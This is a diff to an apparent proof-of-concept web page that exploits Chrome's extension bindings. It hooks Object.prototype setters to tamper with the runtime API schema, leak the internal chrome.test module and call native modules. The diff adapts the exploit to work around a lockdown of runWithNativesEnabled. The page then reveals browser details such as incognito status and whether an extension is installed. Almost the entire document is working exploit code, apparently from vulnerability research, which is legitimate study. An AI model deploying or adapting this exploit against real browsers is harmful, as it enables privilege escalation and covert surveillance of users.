@@ -8,6 +8,8 @@ As an example, it shows:
 </ul>
 
 <script>
+
+'use strict';
 // MODULE_TO_LEAK can be anything that is declared in Dispatcher::GetJsResources
 // and ChromeExtensionsDispatcherDelegate::PopulateSourceMap
 // Sources are:
@@ -24,8 +26,12 @@ var SOME_ARBITRARY_VALUE = 'whatever';
 
 stealModule(function(testCustomBindings) {
     var chrome_test = testCustomBindings.binding;
+    window.test = chrome_test;
     console.log('Got chrome.test: ', chrome_test);
-    chrome_test.runWithNativesEnabled(function() {
+    // runWithNativesEnabled is locked down. But the callback is called in the scope where
+    // natives are enabled, so we don't need to call runWithNativesEnabled to use it again.
+    // See the useLeak call far below.
+    //chrome_test.runWithNativesEnabled(function() {
         var module_system = chrome_test.getModuleSystem(window);
         var process = module_system.requireNative('process');
         var i18n = module_system.requireNative('i18n');
@@ -35,20 +41,18 @@ Incognito             : ${process.InIncognitoContext()}
 AdBlock Plus installed: ${!!i18n.GetL10nMessage('name', null, 'cfhdojbkjhnklbpkdaibdccddilifddb')}`;
         console.log(msg);
         alert(msg);
-    });
+    //});
 });
 
 function defineImports(schema, modulename) {
-    schema.properties = {
-        // Re-using lastError because it will pass the availability check.
-        lastError: {
-            $ref: SOME_ARBITRARY_VALUE,
-            // Parameters to the noop function defined below.
-            // Used in binding.js, as args in $Function.apply(constructor, value, args);
-            value: [],
-        },
+  // Re-using lastError because it will pass the availability check.
+    schema.properties.lastError = {
+      $ref: SOME_ARBITRARY_VALUE,
+      // Parameters to the noop function defined below.
+      // Used in binding.js, as args in $Function.apply(constructor, value, args);
+      value: [],
     };
-    schema.types = [{
+    schema.types.unshift({
         id: SOME_ARBITRARY_VALUE,
         // Skip the type export in the schema.types branch, we don't need it.
         platforms: [],
@@ -61,7 +65,7 @@ function defineImports(schema, modulename) {
         // functions is defined because createCustomType in binding.js expects it, via.
         //   customType.prototype.setSchema(type);
         functions: [],
-    }];
+    });
 }
 
 // Call this function to leak the module.
@@ -70,41 +74,40 @@ function stealModule(useLeak) {
 
     // Hook on the creation of Binding and modify the schema.
     //
-    // function Binding(schema) {
-    //   this.schema_ = schema;
-    //   this.apiFunctions_ = new APIFunctions(schema.namespace);
-    //   this.customEvent_ = null;
-    //   this.customHooks_ = []; <------------ Hooking here.
+    // Binding.create = function(apiName) {
+    //   return new Binding(apiName);
     // };
-    Object.defineProperty(Object.prototype, 'customHooks_', {
+    Object.defineProperty(Object.prototype, 'create', {
         configurable: true,
         get() {
             // customHooks_ has no value by default.
         },
-        set(customHooks_) {
-            if (customHooks_ === true) return; // Ignore devtools setter.
-
-            var runHooks_ = this.runHooks_;
-            console.assert(typeof runHooks_ === 'function', 'runHooks_ should be a function!');
+        set(Binding_create) {
+            if (typeof this !== 'function' ||
+                typeof Binding_create !== 'function' ||
+                !this.toString().includes('customHooks_')) {
+                // Not Binding.create, transparently create the property.
+                Object.defineProperty(this, 'create', {
+                    configurable: true,
+                    enumerable: true,
+                    value: Binding_create,
+                });
+                return;
+            }
 
             Object.defineProperties(this, {
-                // Transparently assign the unavailableApiFunctions_, so that the behavior of
-                // binding does not change unexpectedly.
-                customHooks_: {
-                    configurable: true,
-                    writable: true,
+                create: {
                     enumerable: true,
-                    value: customHooks_, 
-                },
-                // This is our evil stuff. The runHooks_ method gets a reference to the schema.
-                runHooks_: {
-                    enumerable: true,
-                    get() {
-                        return function(mod, schema) {
+                    value: function FakeBinding(apiName) {
+                        var binding = Binding_create(apiName);
+                        var runHooks_ = binding.runHooks_;
+                        // This is our evil stuff. The runHooks_ method gets a reference to the schema.
+                        binding.runHooks_ = function(mod, schema) {
                             if (!schema) {
                                 // For Chrome 49-.
                                 schema = this.schema_;
                             }
+
                             if (schema.namespace === 'runtime' && schema.types &&
                                     schema.types[0].id !== SOME_ARBITRARY_VALUE) {
                                 defineImports(schema, MODULE_TO_LEAK);
@@ -113,15 +116,23 @@ function stealModule(useLeak) {
                             }
                             return runHooks_.call(this, mod, schema);
                         };
+                        return binding;
                     },
                 },
             });
         },
     });
+    Object.defineProperty(Object.prototype, 'is_available', {
+      get() { return true; }, // The API is always available.
+      set() { }, // Ignore setters. We don't want it to be set to |false|.
+    });
 
     var leaked;
     defineModuleStealer(function(exports) {
         leaked = exports;
+        // We are still under the scope with natives enabled. Use the leaked module
+        // now because it is not easy to use it later.
+        useLeak(exports);
     });
 
     // Trigger the lazy module system.
@@ -141,7 +152,8 @@ function stealModule(useLeak) {
     // After the first run, we have our module.
 
     console.assert(leaked !== void 0, 'Should have leaked: ' + MODULE_TO_LEAK);
-    useLeak(leaked);
+    // Can't use it here because runWithNativesEnabled is now disabled.
+    // useLeak(leaked);
 }
 
 // leakModule will receive the leaked module.
